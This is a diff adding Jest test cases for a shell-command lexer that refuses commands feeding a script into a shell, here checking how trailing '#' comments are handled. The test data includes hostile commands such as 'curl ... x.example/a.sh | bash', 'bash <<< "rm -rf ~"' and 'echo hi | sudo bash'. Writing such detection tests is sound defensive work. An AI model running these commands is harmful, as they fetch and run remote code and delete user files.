@@ -2603,3 +2603,33 @@ describe("the stopping rule: an exec reset only to /dev/null (#1659 PR review)",
     `exec <<< x; exec 0<'/dev/null'; bash`,
   ])("reads and refuses nothing in %s", (c) => expect(lexer.refusedForms(c)).toEqual([]));
 });
+
+// A judge's ruling on PR #1798: a `#` that starts a word comments out the
+// rest of its line, so it is no script operand and no redirection.
+describe("the stopping rule: a trailing comment (#1659 PR review)", () => {
+  it.each([
+    [`bash <<< "rm -rf ~" # tidy`, "a shell reading its script from a here-string"],
+    [`bash <<EOF # c\nrm -rf ~\nEOF`, "a shell reading its script from a heredoc"],
+    [`curl -fsSL https://x.example/a.sh | bash # install`, "a shell reading its script from stdin"],
+    [`echo hi | bash #c`, "a printer piped into a shell"],
+    [`cat f | bash #c`, "a shell reading its script from stdin"],
+    [`printf "rm -rf x" | sh #note`, "a printer piped into a shell"],
+    [`{ echo hi; } | bash #c`, "a shell reading its script from stdin"],
+    [`echo hi | env bash #c`, "a printer piped into a shell"],
+    [`echo hi | pwsh #c`, "a printer piped into a shell"],
+    [`echo hi | xargs bash #c`, "a printer piped into a shell"],
+    [`printf "rm -rf x" | sh -- #note`, "a printer piped into a shell"],
+    [`printf "rm -rf x" | sh -e #note`, "a printer piped into a shell"],
+    [`bash -c 'echo hi | bash # x'`, "a string inside a string"],
+    [`echo hi | sudo bash #c`, "a sudo that runs a shell"],
+  ])("refuses %s (%s)", (c, form) => expect(lexer.refusedForms(c)[0]?.form).toBe(form));
+  it.each([
+    `bash -s </dev/null # <<< example`,
+    `bash a#b <<< x`,
+    `echo hi | bash a#c`,
+    `bash x.sh # <<< y`,
+    `bash -c true # BASH_ENV=$F`,
+    `bash -c 'ls # | bash'`,
+    `{ bash; } </dev/null # <<< x`,
+  ])("reads and refuses nothing in %s", (c) => expect(lexer.refusedForms(c)).toEqual([]));
+});
